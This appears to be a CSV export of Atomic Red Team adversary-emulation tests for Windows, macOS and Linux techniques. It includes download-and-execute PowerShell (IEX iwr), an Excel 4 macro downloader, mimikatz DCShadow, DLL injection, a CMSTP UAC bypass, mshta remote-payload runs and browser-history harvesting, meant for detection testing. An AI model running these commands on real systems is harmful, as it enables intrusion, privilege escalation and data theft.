"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","Maldoc choice flags command execution","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""  a = Shell(`""cmd.exe /c choice /C Y /N /D Y /T 3`"", vbNormalFocus)""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
",
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","OSTAP JS version","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   a = Shell(`""cmd.exe /c wscript.exe //E:jscript #{jse_path}`"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
",
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","Office launching .bat file from AppData","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{bat_path}`"" For Output As #1`n   Write #1, `""calc.exe`""`n   Close #1`n   a = Shell(`""cmd.exe /c #{bat_path} `"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
","Remove-Item #{bat_path} -ErrorAction Ignore
Get-Process | Where-Object { $_.MainModule.FileName -like ""*calculator*"" } | Stop-Process
"
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","Excel 4 Macro","$fname = ""$env:TEMP\atomic_redteam_x4m_exec.vbs""
$fname1 = ""$env:TEMP\procexp.exe""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject ""Excel.Application""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (""#{uname}"" -ne """") {
  $sheet.Cells.Item(1,1) = ""#{uname}""
} else {
  $sheet.Cells.Item(1,1) = ""=GET.WORKSPACE(26)""
}

$sheet.Cells.Item(2,1) = ""procexp.exe""
$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""
$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""
$sheet.Cells.Item(5,1) = ""=FOPEN(`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"", 3)""
$sheet.Cells.Item(6,1) = ""=FWRITELN(A5, `""url = `""`""#{download_url}`""`""`"")""
$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""
$sheet.Cells.Item(8,1) = ""=FWRITELN(A5, `""Set winHttp = CreateObject(`""`""WinHTTP.WinHTTPrequest.5.1`""`"")`"")""
$sheet.Cells.Item(9,1) = ""=FWRITELN(A5, `""winHttp.Open `""`""GET`""`"", url, False`"")""
$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""
$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""
$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""
$sheet.Cells.Item(13,1) = ""=FWRITELN(A5, `""oStream.Open`"")""
$sheet.Cells.Item(14,1) = ""=FWRITELN(A5, `""oStream.Type = 1`"")""
$sheet.Cells.Item(15,1) = ""=FWRITELN(A5, `""oStream.Write winHttp.responseBody`"")""
$sheet.Cells.Item(16,1) = ""=FWRITELN(A5, `""oStream.SaveToFile `""`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`""`"", 2`"")""
$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""
$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""
$sheet.Cells.Item(19,1) = ""=FCLOSE(A5)""
$sheet.Cells.Item(20,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"")""
$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""
$sheet.Cells.Item(22,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`"")""
$sheet.Cells.Item(23,1) = ""=HALT()""
$sheet.Cells.Item(1,1).Name = ""runme""
$xlApp.Run(""runme"")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp
","Stop-Process -Name ""procexp*"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\atomic_redteam_x4m_exec.vbs"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\procexp.exe"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","Potentially Unwanted Applications (PUA)","Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
& ""#{pua_file}""
","Stop-Process -name PotentiallyUnwanted
Remove-Item #{pua_file} -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","Office Generic Payload Download","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macroCode = Get-Content ""#{macro_path}"" -Raw
$URL = ""#{c2_domain}"" + ""/"" + ""#{c2_parent_directory}""
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', ""#{file_name}""
Invoke-MalDoc -macroCode $macroCode -officeProduct ""#{ms_product}""
","Remove-Item ""C:\Users\$env:username\Desktop\#{file_name}"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1204.002\T1204.002.yaml","Simulate Click-Fix via Downloaded BAT File","$url = ""#{url}""
$outfile = ""#{outfile}""
Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
$process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
$process.Id | Out-File ""$env:TEMP\click-fix-pid.txt""
","if (Test-Path ""$env:TEMP\click-fix-pid.txt"") {
  $pid = Get-Content ""$env:TEMP\click-fix-pid.txt""
  Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
  Remove-Item ""$env:TEMP\click-fix-pid.txt"" -ErrorAction SilentlyContinue
}
Remove-Item ""#{outfile}"" -ErrorAction SilentlyContinue
"
"C:\AtomicRedTeam\atomics\T1207\T1207.yaml","DCShadow (Active Directory)","# starting fake DC server, as SYSTEM (required)
$dc_output_file = ""PathToAtomicsFolder\..\ExternalPayloads\art-T1207-mimikatz-DC.log""
Remove-Item $dc_output_file -ErrorAction Ignore
$mimikatzParam =""`""log $dc_output_file`"" `""lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`"" `""exit`""""
$dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList ""/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam""

# wait for fake DC server to be ready...
Start-Sleep -Seconds 5

# server ready, so trigger replication (push) and wait until it finished
& ""#{mimikatz_path}"" ""lsadump::dcshadow /push"" ""exit""

Write-Host ""`nWaiting for fake DC server to return""
Wait-Process $dc

Write-Host ""`nOutput from fake DC server:""
Get-Content $dc_output_file
Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
Remove-Item $dc_output_file -ErrorAction Ignore

Write-Host ""End of DCShadow""
","Stop-Process -Name ""mimikatz"" -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1216\T1216.yaml","SyncAppvPublishingServer Signed Script PowerShell Command Execution","C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;#{command_to_execute}""
",
"C:\AtomicRedTeam\atomics\T1216\T1216.yaml","manage-bde.wsf Signed Script Command Execution","set comspec=#{command_to_execute}
cscript %windir%\System32\manage-bde.wsf
","set comspec=%windir%\System32\cmd.exe
"
"C:\AtomicRedTeam\atomics\T1216.001\T1216.001.yaml","PubPrn.vbs Signed Script Bypass","cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""
",
"C:\AtomicRedTeam\atomics\T1217\T1217.yaml","List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux","find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
","rm -f #{output_file} 2>/dev/null
"
"C:\AtomicRedTeam\atomics\T1217\T1217.yaml","List Mozilla Firefox Bookmark Database Files on macOS","find / -path ""*/Firefox/Profiles/*/places.sqlite"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
","rm -f #{output_file} 2>/dev/null
"
"C:\AtomicRedTeam\atomics\T1217\T1217.yaml","List Google Chrome Bookmark JSON Files on macOS","find / -path ""*/Google/Chrome/*/Bookmarks"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
","rm -f #{output_file} 2>/dev/null
"
"C:\AtomicRedTeam\atomics\T1217\T1217.yaml","List Google Chromium Bookmark JSON Files on FreeBSD","find / -path ""*/.config/chromium/*/Bookmarks"" -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null
","rm -f #{output_file} 2>/dev/null
"
"C:\AtomicRedTeam\atomics\T1217\T1217.yaml","List Safari Bookmarks on MacOS","find / -path ""*/Safari/Bookmarks.plist"" 2>/dev/null >> #{output_file} 
cat #{output_file} 
","rm -f #{output_file} 2>/dev/null
"
"C:\AtomicRedTeam\atomics\T1217\T1217.yaml","Extract Edge Browsing History","$URL_Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$History = Get-Content -Path ""#{history_path}"" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique
$History | Out-File -FilePath ""#{dest_path}""
","Remove-Item -Path ""#{dest_path}""
"
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","mavinject - Inject DLL into running process","mavinject.exe #{process_id} /INJECTRUNNING ""#{dll_payload}""
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","Register-CimProvider - Execute evil dll","C:\Windows\SysWow64\Register-CimProvider.exe -Path ""#{dll_payload}""
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","InfDefaultInstall.exe .inf Execution","InfDefaultInstall.exe ""#{inf_to_execute}""
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","ProtocolHandler.exe Downloaded a Suspicious File","FOR /F ""tokens=2*"" %a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%b
call ""%microsoft_wordpath%\protocolhandler.exe"" ""ms-word:nft|u|#{remote_url}""
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","Microsoft.Workflow.Compiler.exe Payload Execution","#{mwcpath}\#{mwcname} ""#{xml_payload}"" output.txt
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","Renamed Microsoft.Workflow.Compiler.exe Payload Executions","&""#{renamed_binary}"" ""#{xml_payload}"" output.txt
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","Invoke-ATHRemoteFXvGPUDisablementCommand base test","Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","DiskShadow Command Execution","#{dspath} -S #{txt_payload} 
",
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","Load Arbitrary DLL via Wuauclt (Windows Update Client)","wuauclt.exe /UpdateDeploymentProvider ""#{arbitrary_dll}"" /RunHandlerComServer
","taskkill /f /im calculator.exe > nul 2>&1"
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","Lolbas ie4uinit.exe use as proxy","copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
copy ""#{Path_inf}"" %TEMP%\ieuinit.inf
%TEMP%\ie4uinit.exe -BaseSettings
","del %TEMP%\ie4uinit.exe >nul 2>&1
del %TEMP%\ieuinit.inf >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","LOLBAS CustomShellHost to Spawn Process","if (-not (Test-Path #{dest_path})) {
New-Item -Path #{dest_path} -ItemType Directory
} else {
Write-Host ""Directory #{dest_path} already exists."" }
Copy-Item -Path ""C:\windows\system32\customshellhost.exe"" -Destination ""#{dest_path}\customshellhost.exe"" -Force
Copy-Item -Path ""C:\windows\system32\calc.exe"" -Destination ""#{dest_path}\explorer.exe"" -Force
#{dest_path}\customshellhost.exe
","Remove-Item -Path #{dest_path} -Recurse -Force
"
"C:\AtomicRedTeam\atomics\T1218\T1218.yaml","System Binary Proxy Execution - Wlrmdr Lolbin","wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u ""#{payload_path}""",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Compiled HTML Help Local Payload","hh.exe ""#{local_chm_file}""
",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Compiled HTML Help Remote Payload","hh.exe #{remote_chm_file}
",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Invoke CHM with default Shortcut Command Execution","Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Invoke CHM with InfoTech Storage Protocol Handler","Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Invoke CHM Simulate Double click","Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Invoke CHM with Script Engine and Help Topic","Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Invoke CHM Shortcut Command with ITS and Help Topic","Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}",
"C:\AtomicRedTeam\atomics\T1218.001\T1218.001.yaml","Decompile Local CHM File","hh.exe -decompile %temp% ""#{local_chm_file}""
","del %temp%\T1218.001.html >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1218.002\T1218.002.yaml","Control Panel Items","control.exe ""#{cpl_file_path}""
",
"C:\AtomicRedTeam\atomics\T1218.003\T1218.003.yaml","CMSTP Executing Remote Scriptlet","cmstp.exe /s ""#{inf_file_path}""
",
"C:\AtomicRedTeam\atomics\T1218.003\T1218.003.yaml","CMSTP Executing UAC Bypass","cmstp.exe /s ""#{inf_file_uac}"" /au
",
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","CheckIfInstallable method call","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallHelper method call","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallUtil class constructor method call","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallUtil Install method call","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false /installtype=notransaction /action=install `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_Install_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallUtil Uninstall method call - /U variant","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false /U `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_Uninstall_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallUtil HelpText method call","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""/? `""$InstallerAssemblyFullPath`""""
$ExpectedOutput = 'Constructor_HelpText_'

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = '#{invocation_method}'
    CommandLine = $CommandLine
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","$InstallerAssemblyDir = ""#{assembly_dir}""
$InstallerAssemblyFileName = ""#{assembly_filename}""
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.004\T1218.004.yaml","InstallUtil evasive invocation","# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
. ""#{test_harness}""

$InstallerAssemblyDir = ""$Env:windir\System32\Tasks""
$InstallerAssemblyFileName = 'readme.txt'
$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

$CommandLine = ""readme.txt""
$ExpectedOutput = 'Constructor_'

# Explicitly set the directory so that a relative path to readme.txt can be supplied.
Set-Location ""$Env:windir\System32\Tasks""

Copy-Item -Path ""$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe"" -Destination ""$Env:windir\System32\Tasks\notepad.exe""

$TestArgs = @{
    OutputAssemblyDirectory = $InstallerAssemblyDir
    OutputAssemblyFileName = $InstallerAssemblyFileName
    InvocationMethod = 'Executable'
    CommandLine = $CommandLine
    InstallUtilPath = ""$Env:windir\System32\Tasks\notepad.exe""
}

$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

if ($ActualOutput -ne $ExpectedOutput) {
    throw @""
Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
Expected: $ExpectedOutput
Actual: $ActualOutput
""@
}
","Remove-Item -Path ""$Env:windir\System32\Tasks\readme.txt"" -ErrorAction Ignore
Remove-Item -Path ""$Env:windir\System32\Tasks\readme.InstallLog"" -ErrorAction Ignore
Remove-Item -Path ""$Env:windir\System32\Tasks\readme.InstallState"" -ErrorAction Ignore
Remove-Item -Path ""$Env:windir\System32\Tasks\notepad.exe"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject","mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
",
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Mshta Executes Remote HTML Application (HTA)","$var =Invoke-WebRequest ""#{hta_url}""
$var.content|out-file ""#{temp_file}""
mshta ""#{temp_file}""
start-sleep -s 15
stop-process -name ""calculator"" -Force -ErrorAction Ignore
stop-process -name ""CalculatorApp"" -Force -ErrorAction Ignore
","remove-item ""#{temp_file}"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement","Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}",
"C:\AtomicRedTeam\atomics\T1218.005\T1218.005.yaml","Invoke HTML Application - Jscript Engine Simulating Double Click","Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick",
